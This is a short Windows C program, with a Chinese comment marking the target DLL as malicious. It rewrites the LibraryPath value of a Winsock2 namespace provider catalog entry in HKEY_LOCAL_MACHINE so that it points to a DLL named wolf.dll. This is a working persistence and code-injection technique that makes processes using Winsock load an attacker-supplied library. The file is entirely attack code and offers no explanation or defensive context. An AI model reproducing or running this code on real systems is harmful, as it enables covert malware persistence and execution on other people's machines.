#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  //恶意DLL路径
  const char* dll = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.dll";

  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"System\\CurrentControlSet\\Services\\WinSock2\\Parameters\\NameSpace_Catalog5\\Catalog_Entries64\\000000000007", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"LibraryPath", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  }
  return 0;
}
